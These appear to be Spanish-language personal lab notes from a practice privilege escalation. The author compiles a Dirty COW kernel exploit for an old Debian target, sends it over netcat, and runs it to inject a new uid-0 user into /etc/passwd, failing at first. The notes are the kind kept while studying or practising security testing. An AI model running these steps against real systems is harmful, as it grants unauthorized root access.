Lo primero averiguo la version del debian:
```bash
$ cat /etc/debian_version
6.0.5
```
lo transformo a .c
```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql]
└─$ mv 40611 40611.c
```

Crear el docker-compose:
```D
version: '3.8'
services:
  exploit-compiler:
    image: debian:wheezy
    volumes:
      - data:/src
    working_dir: /src
    command: bash -c "apt-get update && apt-get install -y gcc-multilib g++-multilib && gcc -m32 -o exploit tu_exploit.c"

volumes:
  data:
    name: data

```

En la kali creo una contraseña con openssl para el /etc/passwd
```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql/shell_sql_dirtycow/data] └─$ openssl passwd -1 "1234" $1$s54.Sc0j$66qZvulvJf.YvSlLD6LSe.
```

envio el fichero compilado al server:

```bash
┌──(kali㉿kali)-[~/Desktop/shel_sql/shell_sql_dirtycow/data]
└─$ nc 10.0.2.8 12345 < /home/kali/Desktop/shel_sql/shell_sql_dirtycow/data/dirtyC0w


# server:
$ nc -lvnp 12345 > /tmp/dirtyc0w
listening on [any] 12345 ...

# lanzo el exploit:
./dirtyc0w /etc/passwd "nuevoUsuario:$1$s54.Sc0j$66qZvulvJf.YvSlLD6LSe.:0:0:root:/root:/bin/bash\n"
```
No funciona:
```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
```


```bash
# lanzo el exploit:
./d /etc/passwd "nuevoUsuario:$1$s54.Sc0j$66qZvulvJf.YvSlLD6LSe.:0:0:root:/root:/bin/bash\n"
```
